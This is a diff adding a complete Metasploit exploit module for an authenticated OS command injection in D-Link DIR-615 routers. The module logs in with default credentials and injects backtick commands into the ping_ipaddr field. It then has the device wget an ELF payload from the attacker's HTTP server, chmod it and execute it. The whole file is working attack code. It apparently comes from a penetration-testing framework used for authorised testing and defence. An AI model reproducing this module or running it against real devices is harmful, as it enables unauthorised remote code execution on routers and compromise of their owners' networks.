@@ -1,0 +1,250 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'D-Link DIR615h OS Command Injection',
+        'Description' => %q{
+          Some D-Link Routers are vulnerable to an authenticated OS command injection on
+          their web interface, where default credentials are admin/admin or admin/password.
+          Since it is a blind os command injection vulnerability, there is no output for the
+          executed command when using the cmd generic payload. This module was tested against
+          a DIR-615 hardware revision H1 - firmware version 8.04. A ping command against a
+          controlled system could be used for testing purposes. The exploit uses the wget
+          client from the device to convert the command injection into an arbitrary payload
+          execution.
+        },
+        'Author' => [
+          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module
+          'juan vazquez' # minor help with msf module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2013-10059' ],
+          [ 'BID', '57882' ],
+          [ 'EDB', '24477' ],
+          [ 'OSVDB', '90174' ],
+          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-008' ]
+        ],
+        'DisclosureDate' => '2013-02-07',
+        'Privileged' => true,
+        'Payload' => {
+          'DisableNops' => true
+        },
+        'Targets' => [
+          [
+            'CMD',
+            {
+              'Arch' => ARCH_CMD,
+              'Platform' => 'unix'
+            }
+          ],
+          [
+            'Linux mipsel Payload',
+            {
+              'Arch' => ARCH_MIPSLE,
+              'Platform' => 'linux'
+            }
+          ],
+        ],
+        'DefaultTarget' => 1,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
+
+    register_options(
+      [
+        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'admin' ]),
+        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'admin' ]),
+        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),
+        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
+        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])
+      ]
+    )
+  end
+
+  def request(cmd)
+    res = send_request_cgi({
+      'uri' => @uri,
+      'method' => 'GET',
+      'vars_get' => {
+        'page' => 'tools_vct',
+        'hping' => '0',
+        'ping_ipaddr' => "1.1.1.1`#{cmd}`",
+        'ping6_ipaddr' => ''
+      }
+    })
+    return res
+  rescue ::Rex::ConnectionError
+    vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to connect to the web server")
+    return nil
+  end
+
+  def exploit
+    downfile = datastore['DOWNFILE'] || rand_text_alpha(rand(8..15))
+    @uri = '/tools_vct.htm'
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
+    @timeout = 5
+
+    #
+    # testing Login
+    #
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Trying to login with #{user} / #{pass}")
+    begin
+      res = send_request_cgi({
+        'uri' => '/login.htm',
+        'method' => 'POST',
+        'vars_post' => {
+          'page' => 'login',
+          'submitType' => '0',
+          'identifier' => '',
+          'sel_userid' => user,
+          'userid' => '',
+          'passwd' => pass,
+          'captchapwd' => ''
+        }
+      })
+      if res.nil? or res.code == 404
+        fail_with(Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
+      end
+      if res.body =~ %r{<script\ langauge="javascript">showMainTabs\("setup"\);</script>}
+        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Successful login #{user}/#{pass}")
+      else
+        fail_with(Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
+      end
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
+    end
+
+    if target.name =~ /CMD/
+      if !(datastore['CMD'])
+        fail_with(Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
+      end
+      cmd = payload.encoded
+      res = request(cmd)
+      if (!res)
+        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
+      else
+        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Blind Exploitation - unknown Exploitation state")
+      end
+      return
+    end
+
+    # thx to Juan for his awesome work on the mipsel elf support
+    @pl = generate_payload_exe
+    @elf_sent = false
+
+    #
+    # start our server
+    #
+    resource_uri = '/' + downfile
+
+    if (datastore['DOWNHOST'])
+      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
+    else
+      service_url = 'http://' + srvhost_addr + ':' + datastore['SRVPORT'].to_s + resource_uri
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Starting up our web service on http://#{Rex::Socket.to_authority(bindhost, bindport)}/#{resource_uri}...")
+      start_service({
+        'Uri' => {
+          'Proc' => proc do |cli, req|
+            on_request_uri(cli, req)
+          end,
+          'Path' => resource_uri
+        },
+        'ssl' => false # do not use SSL
+      })
+
+    end
+
+    #
+    # download payload
+    #
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Asking the D-Link device to download #{service_url}")
+    # this filename is used to store the payload on the device
+    filename = rand_text_alpha_lower(8)
+
+    # not working if we send all command together -> lets take three requests
+    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}"
+    res = request(cmd)
+    if (!res)
+      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
+    end
+
+    # wait for payload download
+    if (datastore['DOWNHOST'])
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Giving #{datastore['HTTP_DELAY']} seconds to the D-Link device to download the payload")
+      select(nil, nil, nil, datastore['HTTP_DELAY'])
+    else
+      wait_linux_payload
+    end
+    register_file_for_cleanup("/tmp/#{filename}")
+
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Waiting #{@timeout} seconds for reloading the configuration")
+    select(nil, nil, nil, @timeout)
+
+    #
+    # chmod
+    #
+    cmd = "chmod 777 /tmp/#{filename}"
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Asking the D-Link device to chmod #{downfile}")
+    res = request(cmd)
+    if (!res)
+      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
+    end
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Waiting #{@timeout} seconds for reloading the configuration")
+    select(nil, nil, nil, @timeout)
+
+    #
+    # execute
+    #
+    cmd = "/tmp/#{filename}"
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Asking the D-Link device to execute #{downfile}")
+    res = request(cmd)
+    if (!res)
+      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
+    end
+  end
+
+  # Handle incoming requests from the server
+  def on_request_uri(cli, _request)
+    # print_status("on_request_uri called: #{request.inspect}")
+    if (!@pl)
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - A request came in, but the payload wasn't ready yet!")
+      return
+    end
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending the payload to the server...")
+    @elf_sent = true
+    send_response(cli, @pl)
+  end
+
+  # wait for the data to be sent
+  def wait_linux_payload
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Waiting for the victim to request the ELF payload...")
+
+    waited = 0
+    until (@elf_sent)
+      select(nil, nil, nil, 1)
+      waited += 1
+      if (waited > datastore['HTTP_DELAY'])
+        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?")
+      end
+    end
+  end
+end
